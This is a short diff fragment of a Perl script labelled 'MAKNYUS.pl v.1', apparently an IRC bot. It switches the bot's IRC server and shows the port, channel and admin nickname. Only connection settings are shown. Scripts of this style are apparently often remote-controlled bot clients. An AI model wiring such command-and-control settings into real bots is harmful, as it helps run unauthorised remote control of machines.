@@ -4,7 +4,7 @@
 ##          MAKNYUS.pl   v.1    ##
 ##################################
 use IO::Socket;
-my $server = "irc.chating.id";
+my $server = "irc.evochat.id";
 my $port = "6667";
 my $channel= "#itsupport";
 my $admin = "ijoo";
